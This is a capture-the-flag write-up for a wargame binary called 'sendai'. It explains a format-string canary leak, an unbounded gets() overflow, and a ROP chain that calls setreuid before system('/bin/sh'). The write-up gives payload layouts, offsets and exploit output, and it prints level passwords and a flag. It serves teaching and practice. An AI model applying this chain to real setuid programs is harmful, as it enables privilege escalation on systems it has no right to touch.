# bonus03 — "Sendai" — Format-String Canary Leak → `gets()` Overflow → ret2libc (+ a dash privilege-drop surprise)

## Concept

`./sendai`, SUID owned by `flagbonus03`, home dir `/home/bonus03/`.
Third bonus level. Structurally this turned out to be the closest
bonus level yet to the mandatory canary-level playbook (format-string
canary leak in one code path, unbounded `gets()` overflow reachable
from another, ret2libc) — but wrapped in a fictional "connection
broker" command interface, and with a genuine new wrinkle: the exploit
needed its own `setreuid()` ROP step even though the target binary
itself never calls `setreuid` anywhere, because the spawned shell
(`dash`) turned out to drop privileges on its own.

## Recon

Login: `ssh bonus03@127.0.0.1 -p 4244`, password = bonus02's flag
(`l2asy8pwncmqtbwfsu12w1hfv3yf6c30`).

No source provided. `ls -la ~`: SUID binary `sendai`, owned by
`flagbonus03`, plus the same `.gdbinit` (pwndbg) seen on bonus02.

`getent passwd flagbonus03` → uid 1030.

`checksec ./sendai` (on the VM):
```
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
Same CET-labeled profile as bonus02 — already established (bonus02's
recon, see `bonus-lessons` memory) that this VM's guest CPU doesn't
expose `shstk`/`ibt` to `/proc/cpuinfo`, so CET enforcement is inert
here; not re-verified per-binary since it's a VM-wide hardware/kernel
property, not a per-binary one.

`nm ./sendai`: `init_connections`, `disconnect_default`, `info_leak`,
`handle_command`, `print_banner`, `main`.

### Disassembling `main`

Just `init_connections()`, `print_banner()`, `handle_command()` — no
interactive-menu surprises, but also no `geteuid`/`setreuid` calls at
all, confirmed both by reading `main`'s disassembly and by
`objdump -T ./sendai | grep -iE "setreuid|geteuid"` (no output — not
even imported). This is different from every mandatory level and both
prior bonus levels, where the target binary synced real/effective uid
itself before anything interesting ran. The process's own effective
uid is still `flagbonus03` throughout regardless (that's what the SUID
bit itself guarantees at `exec` time, independent of any `setreuid`
call) — but this absence turns out to matter once a shell gets
spawned, see "Why setreuid is needed here" below.

### Disassembling `init_connections`, `handle_command`

Reconstructed struct (8-entry global array `conns[]`, `0x38`/56 bytes
per entry, no heap involved this time — everything is a fixed-size
global array, not `malloc`'d):
```c
struct connection {
    int id;                        // +0x00
    int port;                       // +0x04, = id*13 + 0x400
    int connected;                   // +0x08
    char hostname[36];                // +0x0c, "node-%04x.sprawl.net"
    void (*disconnect)(int id);        // +0x30, defaults to disconnect_default
};
```

`handle_command()`'s loop: `info_leak()` every iteration (prints
`"[SENDAI] disconnect@binary: %p\n"` using `disconnect_default`'s own
address — a free PIE-base leak, same idea as level09's free
`puts@libc` leak, just for the binary's own base; not actually needed
for the final exploit here since no PIE-relative address is used, but
its presence confirms PIE's load base is just as deterministic on this
VM as everything else, consistent with `randomize_va_space=0`), then
`fgets` into a safely-bounded 64-byte command buffer, then dispatch on
prefix: `CONNECT:<id>`, `SEND:<id>`, `DISCONNECT:<id>`, `QUIT`.

`SEND:<id>` (after checking `conns[id].connected`):
```c
printf("[SENDAI] Data for conn %u: ", id); fflush(stdout);
gets(local_buf);          // rbp-0x90, UNBOUNDED
printf("[SENDAI] Sent: ");
printf(local_buf);         // printf(attacker_string) -- format-string bug
putchar('\n');
```
Both bugs share the exact same buffer and the exact same `gets()` call:
an unbounded stack overflow (bug #1) and a `printf(user_buf)`
format-string vulnerability (bug #2). A short input only triggers bug
#2 (no overflow); a long, address-laden input triggers bug #1. This
combination — same buffer, same call, two bug classes depending on
payload shape — is new relative to every earlier level, where the leak
and the overflow always lived in physically different functions.

`DISCONNECT:<id>` calls `conns[id].disconnect(id)` — bounds-checked
but not gated on `connected`. Considered as a funcptr-hijack target
(bonus01/02-style), but rejected: the call site passes the raw
connection ID (an integer 0-7) as the argument, not a data pointer —
there's no way to make it also carry a chosen command string the way
bonus01/02's `self`-pointer argument did. The `SEND:` overflow route is
simpler and doesn't need this at all.

## Retrieving the addresses, command by command

Canary leak index for `SEND:`'s `printf(local_buf)`: a breakpoint at
the exact `call printf` instruction inside `handle_command`
(`handle_command+0x243`), run against a local non-privileged copy of
the binary (safe, since reading registers doesn't require SUID), gives
`$rsp`/`$rbp` directly rather than relying on ABI theory alone:
```
RSP = 0x7fffffffd6d0, RBP = 0x7fffffffd7b0
canary @ RBP-8 = 0x7fffffffd7a8, value ends in 0x00 (canary signature)
```
Under the SysV variadic convention, positional indices 1-5 come from
`rsi/rdx/rcx/r8/r9` (index 1, `rdi`, already holds the format string
itself); index 6 onward reads consecutive stack qwords from `[rsp]` at
the call. `(canary_addr - rsp)/8 = 27`, so the canary's positional
index is `6 + 27 = 33`. Verified against the real SUID target: `%33$p`
reliably prints a value ending in `0x00`, different each run.

Overflow offset: `local_buf` sits at `rbp-0x90`, the canary at `rbp-8`,
giving `0x88` (136) bytes of junk up to the canary, 8 more junk bytes
for the (here unused — this is a straight overflow, not a ret2leave
pivot) saved-rbp slot, then the ROP chain. Every `handle_command`
branch except `QUIT`/EOF loops back to the top without going through
the function epilogue, so the canary check — and the ROP chain —
only fires once `QUIT` is sent as the next command.

`setreuid` target uid: `getent passwd flagbonus03` gives `1030`, used
directly for both arguments to `setreuid()` in the chain below.

Alignment fixup: `n_extra_ret = 1` worked immediately against the real
SUID target once the `setreuid` step was in place — the same value
used throughout the rest of this project.

## Why setreuid is needed here

`sendai` never calls `setreuid`/`geteuid` itself (confirmed via
`objdump -T`), and its SUID bit alone keeps the process's own
effective uid at `flagbonus03` throughout. But `/bin/sh` on this
system resolves to `dash`, and a first attempt that chained straight
to `system("/bin/sh")` with no `setreuid` step produced a shell where
`cat /home/flagbonus03/.pass` failed with "Permission denied";
running `id` inside that shell showed a full drop back to
`uid=1014(bonus03)`, revealing that this system's `dash` resets its
effective uid to the real uid at startup whenever it detects
`ruid != euid`. The fix is to perform `setreuid(1030, 1030)` via ROP
(`pop rdi;ret` / `pop rsi;pop rbp;ret` / `setreuid`) before ever
calling `system("/bin/sh")`, using `flagbonus03`'s uid from
`getent passwd` directly; after that, `id` inside the shell reports
`uid=1030(flagbonus03)` and the flag read succeeds.

## Exploit

Two-stage interactive session (`subprocess.Popen`, one continuous
process invocation — canary is per-process, same requirement as every
canary level):

```
CONNECT:0
SEND:0
  "CANARY=%33$p"                    <- leak
SEND:0
  136 bytes junk + canary + 8 junk
  + pop rdi;ret -> 1030
  + pop rsi;pop rbp;ret -> 1030, 0
  + setreuid
  + pop rdi;ret -> "/bin/sh"
  + ret (1 alignment fixup)
  + system
QUIT                                 <- fires the real leave;ret, triggering the chain
<typed into the resulting shell>:
cat /home/flagbonus03/.pass
```

```
$ python3 exploit.py
[+] leaked canary: 0x209564fe9aed1000
[SENDAI] Sent: AAAA...AAAA
[SENDAI] Command: uid=1030(flagbonus03) gid=1016(bonus03) groups=1016(bonus03),1001(levelgroup)
mrc2jp0jsvklrfhjsh5uuwmk26yzyxgq
```

Verified this string works as `bonus04`'s SSH password.

